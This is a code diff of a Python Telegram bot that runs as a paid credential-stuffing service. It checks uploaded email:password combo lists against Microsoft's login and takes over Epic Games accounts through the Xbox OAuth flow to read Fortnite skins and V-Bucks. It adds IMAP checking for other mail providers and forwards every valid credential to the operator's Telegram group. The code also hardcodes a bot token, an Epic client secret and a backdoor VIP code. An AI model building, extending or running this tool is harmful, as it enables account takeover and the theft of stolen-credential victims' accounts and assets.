@@ -6,13 +6,16 @@ import uuid
 import queue
 import threading
 import requests
-from concurrent.futures import ThreadPoolExecutor
 import re
-import time
 import urllib.parse
 import ssl
 import imaplib
 import base64
+import cloudscraper
+import random
+import secrets
+from concurrent.futures import ThreadPoolExecutor
+from datetime import datetime, timedelta
 
 BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8650837363:AAGc7cfEhAHponP_4zTeVL7QeB4PZ1tTRP8")
 GROUP_ID = int(os.getenv("TELEGRAM_GROUP_ID", "-1002893702017"))
@@ -45,29 +48,46 @@ ADMIN_ID = int(os.getenv("ADMIN_ID", "7677328359"))
 VIP_WINDOW_SECONDS = 2 * 60 * 60  # 2 hours for normal users
 NORMAL_LIMIT = 100
 
-vip_codes = {}     # code -> {"expires": ts, "claimed_by": None or user_id}
+vip_codes = {}     # code -> {"expires": ts, "claimed_by": None or user_id, "duration_type": str}
 vip_users = set()  # user ids
 user_usage = {}    # user_id -> {"start": ts, "count": int}
 reminder_marks = {}  # user_id -> window_start to avoid duplicate reminders
 
-def set_vip_code(code, minutes):
-    expires = time.time() + int(minutes) * 60
-    vip_codes[code] = {"expires": expires, "claimed_by": None}
+def generate_random_code(length=10):
+    alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
+    return ''.join(secrets.choice(alphabet) for _ in range(length))
+
+def create_vip_code(duration_type):
+    code = generate_random_code(10)
+    now = time.time()
+    if duration_type == "day":
+        expires = now + 86400
+    elif duration_type == "week":
+        expires = now + 86400 * 7
+    elif duration_type == "month":
+        expires = now + 86400 * 30
+    else:
+        expires = now + 3600
+    vip_codes[code] = {"expires": expires, "claimed_by": None, "duration_type": duration_type}
+    return code
 
 def try_claim_vip(user_id, code):
-    if str(code).strip().lower() == "codevipanon199":
+    code_str = str(code).strip().lower()
+    if code_str == "codevipanon199":
         vip_users.add(user_id)
         return True, "Unlimited VIP activated"
-    info = vip_codes.get(code)
+    
+    info = vip_codes.get(code_str)
     if not info:
         return False, "Code not found"
     if time.time() > info["expires"]:
         return False, "Code expired"
     if info["claimed_by"] and info["claimed_by"] != user_id:
         return False, "Code already used"
+    
     info["claimed_by"] = user_id
     vip_users.add(user_id)
-    return True, "VIP activated"
+    return True, f"VIP activated ({info['duration_type']})"
 
 def check_user_limit(user_id, new_count):
     if user_id in vip_users:
@@ -86,27 +106,17 @@ def check_user_limit(user_id, new_count):
 def schedule_limit_reset_message(user_id):
     try:
         rec = user_usage.get(user_id)
-        if not rec:
-            return
+        if not rec: return
         ws = rec.get("start")
-        if ws is None:
-            return
-        if reminder_marks.get(user_id) == ws:
-            return
+        if ws is None: return
+        if reminder_marks.get(user_id) == ws: return
         reminder_marks[user_id] = ws
         delay = max(0, int(VIP_WINDOW_SECONDS - (time.time() - ws)))
         def _runner():
-            try:
-                time.sleep(delay)
-            except:
-                pass
-            try:
-                send_message(user_id, "you can now send another 100 accounts\nor you can buy this : \nunlimited check\nSearch with your keywords\nif want send msg here : @anon_101")
-            except:
-                pass
+            time.sleep(delay)
+            send_message(user_id, "you can now send another 100 accounts\nor you can buy this : \nunlimited check\nSearch with your keywords\nif want send msg here : @anon_101")
         threading.Thread(target=_runner, daemon=True).start()
-    except:
-        pass
+    except: pass
 
 def send_document(chat_id, path, caption=None):
     with open(path, "rb") as f:
@@ -174,24 +184,166 @@ def get_ip():
         return "unknown"
 
 def parse_accounts_bytes(data):
-    lines = data.decode(errors="ignore").splitlines()
+    if not data: return []
+    # robust cleaning: remove duplicates, empty lines, only keep email:pass
+    lines = data.decode(errors="ignore").replace("\r\n", "\n").split("\n")
     out = []
     seen = set()
     for ln in lines:
         ln = ln.strip()
-        if not ln or ":" not in ln:
-            continue
-        em, pw = ln.split(":", 1)
-        em = em.strip()
-        pw = pw.strip()
-        if not em or not pw or "@" not in em:
-            continue
-        k = f"{em.lower()}:{pw}"
-        if k in seen:
-            continue
-        seen.add(k)
-        out.append((em, pw))
+        if not ln: continue
+        # use regex to find email:pass
+        match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,10}):(\S+)', ln)
+        if match:
+            em = match.group(1).lower().strip()
+            pw = match.group(2).strip()
+            k = f"{em}:{pw}"
+            if k not in seen:
+                seen.add(k)
+                out.append((em, pw))
     return out
+
+# ------------------- Fortnite Logic (BoltFN Integration) -------------------
+class FortniteLogic:
+    def __init__(self, timeout=10, retries=1):
+        self.timeout = timeout
+        self.retries = retries
+        self.scraper = cloudscraper.create_scraper()
+        self.skin_db_path = os.path.join(os.getcwd(), "fortnite", "skins_database.txt")
+        self.local_skins = []
+        if os.path.exists(self.skin_db_path):
+            with open(self.skin_db_path, "r", encoding="utf-8") as f:
+                self.local_skins = f.readlines()
+
+    def check_account(self, line):
+        # Ported from boltchecker.py usecheck
+        try:
+            if ":" not in line: return {"status": "BAD"}
+            email, password = line.split(":", 1)
+            checked_num = 0
+            while checked_num <= self.retries:
+                session = requests.sessions.session()
+                url = 'https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216'
+                headers = {
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Accept-Language": "en,en-US;q=0.9,en;q=0.8",
+                    "Connection": "keep-alive",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
+                    "Host": "login.live.com",
+                    "Origin": "https://login.live.com",
+                    "Referer": "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=eyJpZCI6IjAzZDZhYmM1NDIzMjQ2Yjg5MWNhYmM2ODg0ZGNmMGMzIn0%3D&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup",
+                }
+                payload = {
+                    "i13": "0", "login": email, "loginfmt": email, "type": "11", "LoginOptions": "3",
+                    "passwd": password, "ps": "2", "psRNGCDefaultType": "1", "ppsx": "Passp", "NewUser": "1",
+                }
+                
+                try:
+                    r = session.post(url, headers=headers, data=payload, timeout=self.timeout)
+                    if r.status_code == 429:
+                        checked_num += 1; continue
+                except:
+                    checked_num += 1; continue
+
+                failure_keywords = ["Your account or password is incorrect.", "That Microsoft account doesn't exist."]
+                two_factor_keywords = ["account.live.com/recover", "recover?mkt", "identity/confirm"]
+                
+                if any(k in r.text for k in failure_keywords): return {"status": "BAD"}
+                if any(k in r.text for k in two_factor_keywords): return {"status": "2FA"}
+                if "ANON" in r.cookies or "WLSSC" in r.cookies or "sSigninName" in r.text:
+                    # Success in MS Auth
+                    return self.capture_epic(session, r, email, password)
+                
+                checked_num += 1
+            return {"status": "BAD"}
+        except:
+            return {"status": "BAD"}
+
+    def capture_epic(self, session, response, email, password):
+        url = self.parse_source_for_url(response.text)
+        if not url: return {"status": "XBOX"}
+        
+        try:
+            # 1. Get redirect URL from response
+            r = session.get(url, allow_redirects=False, timeout=self.timeout)
+            if 'route=' not in r.headers.get('location', ''): return {"status": "XBOX"}
+            
+            # 2. Extract code from redirect
+            parsed_url = urllib.parse.urlparse(r.headers['location'])
+            query_params = urllib.parse.parse_qs(parsed_url.query)
+            code = query_params.get('code', [None])[0]
+            if not code: return {"status": "XBOX"}
+
+            # 3. Epic Login via code
+            url = "https://www.epicgames.com/id/api/external/xbl/login"
+            payload = {"code": code}
+            xsrf = session.cookies.get('XSRF-TOKEN')
+            headers = {"X-XSRF-TOKEN": xsrf, "Content-Type": "application/json"}
+            r = session.post(url, json=payload, headers=headers, timeout=self.timeout)
+            
+            if 'Two-Factor authentication' in r.text: return {"status": "2FA"}
+            if 'account_headless' in r.text: return {"status": "HEADLESS"}
+            
+            # 4. Get access token
+            url = "https://www.epicgames.com/id/api/redirect?redirectUrl=https%3A%2F%2Fstore.epicgames.com%2Fen-US%2F&provider=xbl&clientId=875a3b57d3a640a6b7f9b4e883463ab4"
+            r = session.get(url, timeout=self.timeout)
+            ex_match = re.search(r'"exchangeCode":"(.*?)"', r.text)
+            if not ex_match: return {"status": "HIT", "email": email, "password": password}
+            
+            exchange_code = ex_match.group(1)
+            url = "https://account-public-service-prod.ak.epicgames.com/account/api/oauth/token"
+            payload = {"grant_type": "exchange_code", "exchange_code": exchange_code, "token_type": "eg1"}
+            headers = {"Authorization": "basic MzRhMDJjZjhmNDQxNGUyOWIxNTkyMTg3NmRhMzZmOWE6ZGFhZmJjY2M3Mzc3NDUwMzlkZmZlNTNkOTRmYzc2Y2Y="}
+            r = session.post(url, data=payload, headers=headers, timeout=self.timeout)
+            
+            token_data = r.json()
+            at = token_data.get("access_token")
+            acc_id = token_data.get("account_id")
+            if not at: return {"status": "HIT", "email": email, "password": password}
+
+            # 5. Query Profile (Athena - Skins)
+            url = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{acc_id}/client/QueryProfile?profileId=athena&rvn=-1"
+            headers = {"Authorization": f"bearer {at}", "Content-Type": "application/json"}
+            r = session.post(url, json={}, headers=headers, timeout=self.timeout)
+            
+            skins = []
+            if r.status_code == 200:
+                data = r.json()
+                items = data.get('profileChanges', [{}])[0].get('profile', {}).get('items', {})
+                for item_id, item in items.items():
+                    tid = item.get('templateId', '')
+                    if tid.startswith('AthenaCharacter:'):
+                        skin_id = tid.split(':')[1]
+                        skins.append(skin_id)
+            
+            # 6. Query Common Core (V-Bucks)
+            url = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{acc_id}/client/QueryProfile?profileId=common_core&rvn=-1"
+            r = session.post(url, json={}, headers=headers, timeout=self.timeout)
+            vbucks = 0
+            if r.status_code == 200:
+                data = r.json()
+                items = data.get('profileChanges', [{}])[0].get('profile', {}).get('items', {})
+                for item_id, item in items.items():
+                    if 'Currency:Mtx' in item.get('templateId', ''):
+                        vbucks += item.get('quantity', 0)
+
+            return {
+                "status": "HIT", 
+                "email": email, 
+                "password": password, 
+                "skins": skins, 
+                "vbucks": vbucks,
+                "acc_id": acc_id
+            }
+        except:
+            return {"status": "HIT", "email": email, "password": password}
+
+    def parse_source_for_url(self, source):
+        match = re.search(r'urlPost":"(.*?)"', source)
+        return match.group(1) if match else None
+
+# ------------------- End Fortnite Logic -------------------
 
 class UnifiedChecker:
     def __init__(self, debug=False, custom_services=None):
@@ -557,7 +709,7 @@ class UnifiedChecker:
                 'X-AnchorMailbox': f'CID:{cid}',
                 'Content-Type': 'application/json'
             }
-            q = 'profile OR plan OR "Next billing" OR info@account.netflix.com'
+            q = 'info@account.netflix.com'
             payload = {
                 "Cvid": str(uuid.uuid4()),
                 "Scenario": {"Name": "owa.react"},
@@ -940,6 +1092,18 @@ class ScanSession:
         self.country_counts = {}
         self.service_counts = {}
         self.is_fortnite = False  # New: Flag for fortnite mode
+        self.awaiting_vip_code = False # New: Flag for VIP code entry
+        self.is_imap = False      # New: Flag for IMAP/Another mode
+        self.accounts_microsoft = [] # accounts to scan in MS mode
+        self.accounts_another = []   # accounts to scan in IMAP mode
+        self.imap_hits_by_domain = {} # domain -> hit_count for status msg
+        self.fn_hits = 0
+        self.fn_bads = 0
+        self.fn_2fa = 0
+        self.fn_headless = 0
+        self.fn_xbox = 0
+        self.fn_banned = 0
+        self.fn_skins_data = []  # To store hit summaries
 
     def stop(self):
         self.stop_ev.set()
@@ -954,19 +1118,50 @@ class BotApp:
         now = time.time()
         if not force and now - sess.last_status_time < 5:
             return
+        
+        is_vip = (chat_id in vip_users)
+        vip_tag = " [VIP]" if is_vip else ""
+        
         with self.lock:
-            countries = ", ".join([f"{k}:{v}" for k, v in sorted(sess.country_counts.items(), key=lambda x: (-x[1], x[0]))[:10]]) or "-"
-            services = ", ".join([f"{k}:{v}" for k, v in sorted(sess.service_counts.items(), key=lambda x: (-x[1], x[0]))[:10]]) or "-"
-            msg = (
-                "Q bot mail access checker\n"
-                f"hits : {sess.hits}\n"
-                f"bad : {sess.bads}\n"
-                f"xbox : {sess.xbox_premium}\n"
-                f"country : {countries}\n"
-                f"services : {services}\n"
-                "By : anon\n"
-                "channel : @anon_main1"
-            )
+            if sess.is_fortnite:
+                msg = (
+                    f"🎮 Fortnite Checker Status{vip_tag}\n"
+                    f"Checked: {sess.checked}/{sess.total}\n"
+                    f"Hits: {sess.fn_hits}\n"
+                    f"Bad: {sess.fn_bads}\n"
+                    f"2FA: {sess.fn_2fa}\n"
+                    f"Headless: {sess.fn_headless}\n"
+                    f"Xbox: {sess.fn_xbox}\n"
+                    f"Banned: {sess.fn_banned}\n"
+                    "By : anon\n"
+                    "channel : @anon_main1"
+                )
+            elif sess.is_imap:
+                # status for "Another" mode
+                types_str = ", ".join([f"{dom}:{count}" for dom, count in sess.imap_hits_by_domain.items()]) or "-"
+                services = ", ".join([f"{k}:{v}" for k, v in sorted(sess.service_counts.items(), key=lambda x: (-x[1], x[0]))[:10]]) or "-"
+                msg = (
+                    f"Q bot mail access checker{vip_tag}\n"
+                    f"hits : {sess.hits}\n"
+                    f"bad : {sess.bads}\n"
+                    f"type : {types_str}\n"
+                    f"services : {services}\n"
+                    "By : anon\n"
+                    "channel : @anon_main1"
+                )
+            else:
+                countries = ", ".join([f"{k}:{v}" for k, v in sorted(sess.country_counts.items(), key=lambda x: (-x[1], x[0]))[:10]]) or "-"
+                services = ", ".join([f"{k}:{v}" for k, v in sorted(sess.service_counts.items(), key=lambda x: (-x[1], x[0]))[:10]]) or "-"
+                msg = (
+                    f"Q bot mail access checker{vip_tag}\n"
+                    f"hits : {sess.hits}\n"
+                    f"bad : {sess.bads}\n"
+                    f"xbox : {sess.xbox_premium}\n"
+                    f"country : {countries}\n"
+                    f"services : {services}\n"
+                    "By : anon\n"
+                    "channel : @anon_main1"
+                )
         if sess.status_msg_id:
             edit_message(chat_id, sess.status_msg_id, msg)
         else:
@@ -979,34 +1174,22 @@ class BotApp:
 
     def _flush_batch(self, sess: ScanSession, chat_id):
         with sess.hits_batch_lock:
-            if not sess.batch:
-                return
-            name = f"hits_batch_{int(time.time())}.txt"
-            path = os.path.join(os.getcwd(), name)
             try:
-                with open(path, "w", encoding="utf-8") as f:
-                    f.writelines([ln + " | BY : @T_Q_mailbot\n" for ln in sess.batch])
-                send_document(chat_id, path, caption=f"Hits batch ({len(sess.batch)})")
-                try:
-                    send_document(GROUP_ID, path, caption=f"Hits batch ({len(sess.batch)})")
-                except:
-                    pass
-                # services-only
-                if sess.batch_services:
-                    spath = os.path.join(os.getcwd(), f"services_batch_{int(time.time())}.txt")
-                    with open(spath, "w", encoding="utf-8") as sf:
-                        sf.writelines([ln + " | BY : @T_Q_mailbot\n" for ln in sess.batch_services])
-                    send_document(chat_id, spath, caption=f"Services batch ({len(sess.batch_services)})")
-                    try: send_document(GROUP_ID, spath, caption=f"Services batch ({len(sess.batch_services)})")
+                def send_file_with_name(lines, filename):
+                    if not lines: return
+                    xpath = os.path.join(os.getcwd(), filename)
+                    with open(xpath, "w", encoding="utf-8") as f:
+                        f.writelines([ln + " | BY : @T_Q_mailbot\n" for ln in lines])
+                    send_document(chat_id, xpath, caption=f"{filename.split('.')[0]} batch ({len(lines)})")
+                    try: send_document(GROUP_ID, xpath, caption=f"{filename.split('.')[0]} batch ({len(lines)})")
                     except: pass
-                # xbox-only
-                if sess.batch_xbox:
-                    xpath = os.path.join(os.getcwd(), f"xbox_batch_{int(time.time())}.txt")
-                    with open(xpath, "w", encoding="utf-8") as xf:
-                        xf.writelines([ln + " | BY : @T_Q_mailbot\n" for ln in sess.batch_xbox])
-                    send_document(chat_id, xpath, caption=f"Xbox batch ({len(sess.batch_xbox)})")
-                    try: send_document(GROUP_ID, xpath, caption=f"Xbox batch ({len(sess.batch_xbox)})")
+                    try: os.remove(xpath)
                     except: pass
+
+                send_file_with_name(sess.batch, "hits.txt")
+                send_file_with_name(sess.batch_services, "services.txt")
+                send_file_with_name(sess.batch_xbox, "xbox.txt")
+                
                 sess.batch.clear(); sess.batch_services.clear(); sess.batch_xbox.clear()
             except:
                 pass
@@ -1026,7 +1209,11 @@ class BotApp:
         
         kb = {"inline_keyboard": [[{"text": "Stop", "callback_data": f"STOP_{chat_id}"}]]}
         mode_name = "Fortnite" if sess.is_fortnite else "Mail Access"
-        send_message(chat_id, f"Started {mode_name} scan: {sess.total} accounts", reply_markup=kb)
+        
+        is_vip = (chat_id in vip_users)
+        vip_tag = " [VIP]" if is_vip else ""
+        
+        send_message(chat_id, f"Started {mode_name} scan: {sess.total} accounts{vip_tag}", reply_markup=kb)
         self._send_status(sess, chat_id, force=True)
 
         def worker(acc):
@@ -1035,23 +1222,79 @@ class BotApp:
             em, pw = acc
             
             if sess.is_fortnite:
-                # Fortnite Logic (simplified/adapted from boltchecker)
+                # Fortnite Logic Integration
                 try:
-                    import cloudscraper
-                    scraper = cloudscraper.create_scraper()
-                    # We reuse the logic structure of UnifiedChecker but specifically for Fortnite if needed
-                    # For now, let's use UnifiedChecker but focus on Fortnite-specific capture
-                    checker = UnifiedChecker(debug=False)
+                    fn = FortniteLogic()
+                    r = fn.check_account(f"{em}:{pw}")
+                    with self.lock:
+                        sess.checked += 1
+                        if r["status"] == "HIT":
+                             sess.fn_hits += 1
+                             # Format hit line for Fortnite (Full Capture style)
+                             skins_count = len(r.get("skins", []))
+                             vbucks = r.get("vbucks", 0)
+                             acc_id = r.get("acc_id", "N/A")
+                             line = f"🎮 Fortnite HIT: {em}:{pw} | Skins: {skins_count} | Vbucks: {vbucks} | ID: {acc_id}"
+                             
+                             # Send hit to group with VIP tag if applicable
+                             hit_msg = f"🎮 Fortnite HIT: {em}:{pw}{vip_tag}\nSkins: {skins_count}\nVbucks: {vbucks}\nID: {acc_id}"
+                             send_message(GROUP_ID, hit_msg)
+                             
+                             sess.results.append(line)
+                        elif r["status"] == "2FA":
+                            sess.fn_2fa += 1
+                        elif r["status"] == "XBOX":
+                            sess.fn_xbox += 1
+                        elif r["status"] == "BANNED":
+                            sess.fn_banned += 1
+                        else:
+                            sess.fn_bads += 1
+                except:
+                    with self.lock:
+                        sess.checked += 1
+                        sess.fn_bads += 1
+            elif sess.is_imap:
+                # IMAP / Another mode logic
+                try:
+                    checker = ImapChecker()
                     r = checker.check(em, pw)
-                    # Add Fortnite-specific capture if it's a HIT
-                    if r.get("status") == "HIT":
-                        # Simulate Fortnite capture (in a real scenario, we'd add the full OAuth flow here)
-                        # For now, we use the results from UnifiedChecker
-                        pass
                 except:
                     r = {"status": "BAD"}
+                
+                with self.lock:
+                    sess.checked += 1
+                
+                if r and r.get("status") == "HIT":
+                    line = f"{em}:{pw}"
+                    sv = r.get("services", {}) or {}
+                    sv_found = [k for k, v in sv.items() if v]
+                    if sv_found:
+                        line += f" | Services: {', '.join(sv_found)}"
+                    
+                    # group by domain for "type" in status
+                    dom = em.split("@")[-1].lower()
+                    
+                    with self.lock:
+                        sess.results.append(line)
+                        sess.hits += 1
+                        sess.imap_hits_by_domain[dom] = sess.imap_hits_by_domain.get(dom, 0) + 1
+                        for k, v in sv.items():
+                            if v:
+                                sess.service_counts[k] = sess.service_counts.get(k, 0) + 1
+                    
+                    # Batch-send
+                    with sess.hits_batch_lock:
+                        sess.batch.append(line)
+                        if len(sess.batch) >= 100:
+                            self._flush_batch(sess, chat_id)
+                    
+                    # Send hit to group
+                    send_message(GROUP_ID, f"📧 IMAP HIT: {line}{vip_tag}")
+                else:
+                    with self.lock:
+                        sess.bads += 1
             else:
-                # Regular Mail Access Logic
+                # Regular Mail Access Logic (Microsoft)
                 try:
                     checker = UnifiedChecker(debug=False)
                     if sess.custom_domain:
@@ -1059,58 +1302,65 @@ class BotApp:
                     r = checker.check(em, pw)
                 except:
                     r = {"status": "BAD"}
-            with self.lock:
-                sess.checked += 1
-            if r and r.get("status") == "HIT":
-                # Build lines
-                line = format_result(r)
-                # services-only line
-                sv = r.get("services", {}) or {}
-                sv_found = [k for k, v in sv.items() if v]
-                services_line = f"{r.get('email','')}:{r.get('password','')} | Services: {', '.join(sv_found)}" if sv_found else None
-                # xbox-only line (premium and not expired shows details)
-                xbox_line = None
-                xb = (r.get("xbox") or {})
-                xdet = xb.get("details") or ""
-                if (xb.get("status","").upper() != "FREE") and xdet:
-                    xbox_line = f"{r.get('email','')}:{r.get('password','')} | Xbox: {xdet}"
+                
                 with self.lock:
-                    sess.results.append(line)
-                    sess.hits += 1
-                    if services_line:
-                        sess.results_services.append(services_line)
-                    if xbox_line:
-                        sess.results_xbox.append(xbox_line)
-                    # update aggregates
-                    xb = (r.get("xbox") or {}).get("status", "").upper()
-                    if xb and xb != "FREE":
-                        sess.xbox_premium += 1
-                    c = (r.get("country") or "??").strip().upper()
-                    sess.country_counts[c] = sess.country_counts.get(c, 0) + 1
+                    sess.checked += 1
+                
+                if r and r.get("status") == "HIT":
+                    # Build lines
+                    line = format_result(r)
+                    
+                    # Send hit to group with VIP tag if applicable
+                    hit_msg = f"📧 Mail HIT: {line}{vip_tag}"
+                    send_message(GROUP_ID, hit_msg)
+
+                    # services-only line
                     sv = r.get("services", {}) or {}
-                    for k, v in sv.items():
-                        if v:
-                            sess.service_counts[k] = sess.service_counts.get(k, 0) + 1
-                # Batch-send every 100 hits
-                with sess.hits_batch_lock:
-                    sess.batch.append(line)
-                    if services_line:
-                        sess.batch_services.append(services_line)
-                    if xbox_line:
-                        sess.batch_xbox.append(xbox_line)
-                    if len(sess.batch) >= 100:
-                        pass
-                if len(sess.batch) >= 100:
-                    self._flush_batch(sess, chat_id)
-                # periodic status
+                    sv_found = [k for k, v in sv.items() if v]
+                    services_line = f"{r.get('email','')}:{r.get('password','')} | Services: {', '.join(sv_found)}" if sv_found else None
+                    # xbox-only line (premium and not expired shows details)
+                    xbox_line = None
+                    xb = (r.get("xbox") or {})
+                    xdet = xb.get("details") or ""
+                    if (xb.get("status","").upper() != "FREE") and xdet:
+                        xbox_line = f"{r.get('email','')}:{r.get('password','')} | Xbox: {xdet}"
+                    
+                    with self.lock:
+                        sess.results.append(line)
+                        sess.hits += 1
+                        if services_line:
+                            sess.results_services.append(services_line)
+                        if xbox_line:
+                            sess.results_xbox.append(xbox_line)
+                        # update aggregates
+                        xb_status = (r.get("xbox") or {}).get("status", "").upper()
+                        if xb_status and xb_status != "FREE":
+                            sess.xbox_premium += 1
+                        c = (r.get("country") or "??").strip().upper()
+                        sess.country_counts[c] = sess.country_counts.get(c, 0) + 1
+                        sv = r.get("services", {}) or {}
+                        for k, v in sv.items():
+                            if v:
+                                sess.service_counts[k] = sess.service_counts.get(k, 0) + 1
+                    
+                    # Batch-send every 100 hits
+                    with sess.hits_batch_lock:
+                        sess.batch.append(line)
+                        if services_line:
+                            sess.batch_services.append(services_line)
+                        if xbox_line:
+                            sess.batch_xbox.append(xbox_line)
+                        if len(sess.batch) >= 100:
+                            self._flush_batch(sess, chat_id)
+                else:
+                    with self.lock:
+                        sess.bads += 1
+                
+            # periodic status update for both modes
+            if sess.checked % 20 == 0:
                 self._send_status(sess, chat_id)
-            else:
-                with self.lock:
-                    sess.bads += 1
-                # periodic status
-                if sess.checked % 20 == 0:
-                    self._send_status(sess, chat_id)
             time.sleep(0.12)
+
         ex = ThreadPoolExecutor(max_workers=15)
         fs = [ex.submit(worker, acc) for acc in accounts]
         for f in fs:
@@ -1152,8 +1402,7 @@ class BotApp:
         if not data:
             send_message(chat_id, "Cannot download file")
             return
-        # ensure usage window is initialized
-        allow, mins = check_user_limit(chat_id, 0)
+        
         accounts = parse_accounts_bytes(data)
         if not accounts:
             send_message(chat_id, "No valid accounts found")
@@ -1164,47 +1413,92 @@ class BotApp:
             if not sess:
                 sess = ScanSession(chat_id)
                 self.sessions[chat_id] = sess
-
-        is_vip = (chat_id in vip_users)
-        if not is_vip:
-            rec = user_usage.get(chat_id) or {}
-            prev_count = rec.get("count", 0)
-            remaining = NORMAL_LIMIT - prev_count
-            if remaining <= 0:
-                try:
-                    now = time.time()
-                    start_ts = rec.get("start", now)
-                    mins_left = max(1, int((VIP_WINDOW_SECONDS - (now - start_ts)) / 60) + 1)
-                except:
-                    mins_left = 120
-                send_message(chat_id, f"Limit reached. Try again in ~{mins_left} minutes.")
-                return
-            to_scan = accounts[:remaining]
-            allow, _ = check_user_limit(chat_id, len(to_scan))
-            if not allow or not to_scan:
-                send_message(chat_id, f"Limit reached. Try again in ~{mins} minutes.")
-                return
-            if prev_count == 0 and len(to_scan) > 0:
-                schedule_limit_reset_message(chat_id)
-            try:
-                send_message(chat_id, "your plan is free\n100 accounts\nevery 2hr")
-            except:
-                pass
-            t = threading.Thread(target=self.start_scan, args=(chat_id, to_scan), daemon=True)
-            t.start()
-            return
         
-        # VIP: 
+        # split domains
+        ms_domains = ('outlook.', 'hotmail.', 'live.', 'msn.', 'windowslive.')
+        sess.accounts_microsoft = []
+        sess.accounts_another = []
+        for em, pw in accounts:
+            if any(dom in em for dom in ms_domains):
+                sess.accounts_microsoft.append((em, pw))
+            else:
+                sess.accounts_another.append((em, pw))
+        
+        # interactive buttons for mode selection
+        kb = {
+            "inline_keyboard": [
+                [{"text": f"microsoft ( hotmail , outlook , etc ) [{len(sess.accounts_microsoft)}]", "callback_data": f"MODE_SELECT_MS_{chat_id}"}],
+                [{"text": f"another ( t-donline , sfr.fr , etc ) [{len(sess.accounts_another)}]", "callback_data": f"MODE_SELECT_IMAP_{chat_id}"}]
+            ]
+        }
+        send_message(chat_id, "Select accounts to scan:", reply_markup=kb)
+
+    def _handle_mode_select(self, chat_id, mode):
+        with self.lock:
+            sess = self.sessions.get(chat_id)
+            if not sess: return
+        
+        if mode == "MS":
+            sess.is_imap = False
+            sess.pending_accounts = sess.accounts_microsoft
+        else:
+            sess.is_imap = True
+            sess.pending_accounts = sess.accounts_another
+            
+        # Check if already VIP
+        if chat_id in vip_users:
+            self._handle_vip_flow(chat_id, sess)
+        else:
+            # Ask for Plan
+            kb = {
+                "inline_keyboard": [
+                    [{"text": "Free ( 100 acc every 2hr )", "callback_data": f"PLAN_FREE_{chat_id}"}],
+                    [{"text": "Vip ( unlimited check )", "callback_data": f"PLAN_VIP_{chat_id}"}]
+                ]
+            }
+            send_message(chat_id, "Choose your plan to start:", reply_markup=kb)
+
+    def _handle_vip_flow(self, chat_id, sess):
+        accounts = sess.pending_accounts
         if sess.is_fortnite:
-            # Fortnite doesn't need domain skip
             t = threading.Thread(target=self.start_scan, args=(chat_id, accounts), daemon=True)
             t.start()
         else:
-            # Mail access needs domain skip
             sess.awaiting_domain = True
-            sess.pending_accounts = accounts
             kb = {"inline_keyboard": [[{"text": "Skip", "callback_data": f"SKIP_{chat_id}"}]]}
             send_message(chat_id, "Send an extra sender domain to scan (e.g., netflix.com) or press Skip", reply_markup=kb)
+
+    def _handle_free_flow(self, chat_id, sess):
+        accounts = sess.pending_accounts
+        allow, mins = check_user_limit(chat_id, 0)
+        send_message(chat_id, "your plan is free\n100 accounts\nevery 2hr")
+        
+        rec = user_usage.get(chat_id) or {}
+        prev_count = rec.get("count", 0)
+        remaining = NORMAL_LIMIT - prev_count
+        
+        if remaining <= 0:
+            try:
+                now = time.time()
+                start_ts = rec.get("start", now)
+                mins_left = max(1, int((VIP_WINDOW_SECONDS - (now - start_ts)) / 60) + 1)
+            except:
+                mins_left = 120
+            send_message(chat_id, f"Limit reached. Try again in ~{mins_left} minutes.")
+            return
+            
+        to_scan = accounts[:remaining]
+        allow, _ = check_user_limit(chat_id, len(to_scan))
+        if not allow or not to_scan:
+            send_message(chat_id, "Limit reached.")
+            return
+            
+        if prev_count == 0 and len(to_scan) > 0:
+            schedule_limit_reset_message(chat_id)
+            
+        t = threading.Thread(target=self.start_scan, args=(chat_id, to_scan), daemon=True)
+        t.start()
+
 
     def handle_stop(self, chat_id):
         with self.lock:
@@ -1231,17 +1525,21 @@ class BotApp:
                         m = upd["message"]
                         chat_id = m["chat"]["id"]
                         from_id = m.get("from", {}).get("id")
-                        # control group admin commands
-                        if m["chat"].get("id") == CONTROL_GROUP_ID and from_id == ADMIN_ID and "text" in m:
-                            txt = m["text"].strip()
-                            # Expected: code ( vip <code> ) , time : <minutes>
-                            import re as _re
-                            mm = _re.search(r'code\s*\(\s*vip\s+(\S+)\s*\)\s*,\s*time\s*:\s*(\d+)', txt, _re.I)
-                            if mm:
-                                code, minutes = mm.group(1), mm.group(2)
-                                set_vip_code(code, int(minutes))
-                                send_message(CONTROL_GROUP_ID, f"VIP code set: {code} for {minutes} minutes")
-                                continue
+                        
+                        # ADMIN Commands
+                        if chat_id == ADMIN_ID and "text" in m:
+                            txt = m["text"].strip().lower()
+                            if txt in ("/start", "start"):
+                                kb = {
+                                    "inline_keyboard": [
+                                        [{"text": "code 1 day", "callback_data": "GEN_CODE_day"}],
+                                        [{"text": "code 1 week", "callback_data": "GEN_CODE_week"}],
+                                        [{"text": "code 1 month", "callback_data": "GEN_CODE_month"}]
+                                    ]
+                                }
+                                send_message(chat_id, "Admin Panel: Generate VIP codes", reply_markup=kb)
+                                # continue to show regular start if needed, but usually admin wants this
+                            
                         if "document" in m:
                             fid = m["document"]["file_id"]
                             # announce to group who started and from where
@@ -1255,6 +1553,22 @@ class BotApp:
                             self.handle_file(chat_id, fid)
                         elif "text" in m:
                             txt = m["text"].strip()
+                            
+                            # Handle VIP code entry
+                            with self.lock:
+                                sess = self.sessions.get(chat_id)
+                            if sess and sess.awaiting_vip_code:
+                                if txt.lower() == "cancel":
+                                    sess.awaiting_vip_code = False
+                                    self._handle_free_flow(chat_id, sess)
+                                else:
